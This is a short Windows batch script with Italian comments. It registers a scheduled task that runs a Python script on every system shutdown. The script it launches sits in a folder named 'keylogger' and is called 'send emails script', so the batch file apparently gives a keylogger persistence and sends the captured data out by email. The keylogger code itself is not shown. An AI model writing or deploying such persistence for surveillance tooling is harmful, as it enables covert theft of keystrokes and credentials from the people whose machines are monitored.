@echo off
setlocal

:: Percorso dello script Python
set SCRIPT_PATH=C:\Users\ktgki\Desktop\python_scripts\keylogger\send emails script.py

:: Crea un file temporaneo XML per l'evento
set EVENT_XML=%TEMP%\shutdown_event.xml
echo ^<QueryList^> > %EVENT_XML%
echo     ^<Query Id="0" Path="System"^> >> %EVENT_XML%
echo         ^<Select Path="System"^> *[System[Provider[@Name='USER32'] and (EventID=1074)]] ^</Select^> >> %EVENT_XML%
echo     ^</Query^> >> %EVENT_XML%
echo ^</QueryList^> >> %EVENT_XML%

:: Crea una nuova attività per l'evento di spegnimento
schtasks /create /tn "ShutdownScript" /tr "python %SCRIPT_PATH%" /sc onevent /ec System /mo *[System[Provider[@Name='USER32'] and (EventID=1074)]] /f

:: Pulizia
del %EVENT_XML%

echo Task Scheduler configured to run shutdown script.
endlocal
